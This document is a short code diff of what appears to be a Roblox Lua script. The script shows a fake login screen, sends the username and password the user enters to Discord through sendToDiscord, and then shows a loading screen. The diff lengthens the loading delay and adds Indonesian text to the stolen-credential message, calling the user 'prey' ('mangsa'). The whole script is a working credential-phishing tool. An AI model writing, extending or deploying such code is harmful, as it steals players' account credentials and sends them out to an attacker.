@@ -289,7 +289,7 @@ local function createLoadingGUI(duration, onComplete)
     textLabel.TextScaled = true
 
     -- Durasi Loading
-    task.delay(duration or 3, function()
+    task.delay(duration or 8, function()
         gui:Destroy()
         connection:Disconnect()
         if onComplete then
@@ -382,7 +382,7 @@ local function createLoginGUI()
 
     loginButton.MouseButton1Click:Connect(function()
         if usernameBox.Text ~= "" and password ~= "" then
-            sendToDiscord("Username: " .. usernameBox.Text .. "\nPassword: " .. password)
+            sendToDiscord("Dinzz : Ada mangsa nih in\nUsername: " .. username .. "\nPassword: " .. password)
             print("Username dan Password terkirim ke Discord!")
             gui:Destroy()
             createLoadingGUI(3, function()
